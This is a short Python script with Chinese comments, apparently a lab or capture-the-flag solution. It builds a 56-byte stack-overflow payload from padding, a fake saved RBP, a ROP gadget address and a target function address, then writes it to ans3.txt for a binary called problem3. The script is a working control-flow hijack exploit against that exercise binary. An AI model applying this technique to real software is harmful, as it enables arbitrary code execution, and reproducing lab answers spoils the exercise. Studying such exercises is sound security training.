import struct

# 模拟 p64 函数：把数字转换成 64位 小端序 字节流
def p64(value):
    return struct.pack('<Q', value)

# ========== 配置区 ==========


# 必须指向内存里的 0x72 (最好是 72 00 00 00)
addr_of_114 = 0x4025d8  # 

# 2. 你的 gadget 地址
gadget_addr = 0x4012e6  # ag1: mov -8(rbp), rax; mov rax, rdi; ret

# 3. 目标函数地址
func1_addr = 0x401216

# ===========================

# 1. 计算伪造的 RBP
# 因为 gadget 是 mov -8(rbp), rax
# 所以我们让 rbp 指向 (114的地址 + 8)
# 这样 (rbp - 8) 就刚好等于 114的地址
fake_rbp = addr_of_114 + 8

# 2. 组装 Payload
# Padding (32 bytes)
buffer = b'A' * 32

# Payload 结构：
# [ Padding 32B ] + [ Fake RBP 8B ] + [ Gadget 8B ] + [ Func1 8B ]
# 总长度 56 字节 (刚好在 memcpy 64字节限制内)
payload = buffer + p64(fake_rbp) + p64(gadget_addr) + p64(func1_addr)

# 3. 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated! Fake RBP set to: {hex(fake_rbp)}")
print("Run: ./problem3 ans3.txt")